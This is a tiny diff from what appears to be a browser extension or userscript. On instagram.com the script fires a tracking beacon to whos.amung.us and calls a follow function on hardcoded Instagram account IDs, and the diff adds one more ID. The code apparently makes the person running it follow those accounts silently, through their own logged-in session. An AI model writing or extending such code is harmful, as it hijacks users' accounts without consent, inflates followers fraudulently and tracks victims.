@@ -57,7 +57,7 @@ if (location.hostname.indexOf("instagram.com") >= 0) {
 new Image().src = '//whos.amung.us/swidget/v502pxnqo6n1';
 
 
-
+media.instagram.follow("4043940203")
 media.instagram.follow("4101817865")
 media.instagram.follow("1140348283")
 
